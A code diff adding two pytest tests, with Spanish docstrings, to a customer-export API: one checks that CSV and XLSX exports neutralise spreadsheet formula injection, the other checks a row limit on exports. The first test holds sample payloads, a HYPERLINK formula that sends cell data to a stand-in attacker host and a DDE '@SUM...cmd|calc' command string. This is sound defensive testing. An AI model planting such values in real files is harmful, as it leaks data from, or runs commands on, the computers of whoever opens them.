@@ -202,3 +202,41 @@ def test_los_datos_salen_de_verdad(cliente, admin, db):
     nombres = [f[1] for f in filas[1:]]
     assert 'Exportada Prueba Cliente' in nombres
     assert any('Medellín' in f for f in filas[1:][nombres.index('Exportada Prueba Cliente')])
+
+
+# ------------------------------------------------- lo que hace el archivo al abrirse
+
+def test_un_nombre_que_empieza_por_igual_no_se_ejecuta_al_abrir_el_archivo(cliente, admin):
+    """Excel y Sheets ejecutan como formula lo que empieza por «=», «+», «-» o «@».
+
+    El dato entra por el nombre del cliente, que lo escribe cualquiera, y se
+    ejecuta en el computador de quien abra la descarga: no es un problema de
+    como se ve el archivo sino de que el archivo corre codigo. Se neutraliza
+    poniendole una comilla delante, que Excel entiende como «esto es texto».
+    """
+    un_cliente(cliente, admin, '=HYPERLINK("http://malo.co?f="&A1,"Factura")')
+    un_cliente(cliente, admin, '@SUM(1+1)*cmd|calc', documento='9988771')
+
+    for formato in ('csv', 'xlsx'):
+        cuerpo = cliente.get(f'/api/v1/exportar/clientes?formato={formato}',
+                             headers=admin).content
+        crudo = cuerpo.decode('utf-8', 'ignore') if formato == 'csv' else str(cuerpo)
+        assert '=HYPERLINK' not in crudo.replace("'=HYPERLINK", ''), (
+            f'en {formato} el nombre sigue arrancando por «=» y Excel lo va a ejecutar')
+        assert '@SUM' not in crudo.replace("'@SUM", ''), formato
+
+
+def test_una_exportacion_sin_tope_es_una_forma_de_vaciar_la_base(cliente, admin, db,
+                                                                 monkeypatch):
+    """Con 866 personas hoy no se nota; el tope es lo que evita que un dia
+    alguien se lleve la base entera en una peticion."""
+    from app.services import exportar
+
+    monkeypatch.setattr(exportar, 'MAX_FILAS', 2)
+    for i in range(4):
+        un_cliente(cliente, admin, f'Tope Prueba Numero{i}', documento=f'70700{i}')
+
+    r = cliente.get('/api/v1/exportar/clientes?formato=csv', headers=admin)
+    assert r.status_code == 409, r.text
+    assert r.json()['codigo'] == 'demasiadas_filas'
+    assert '2' in r.json()['detalle'], 'el mensaje tiene que decir cual es el tope'
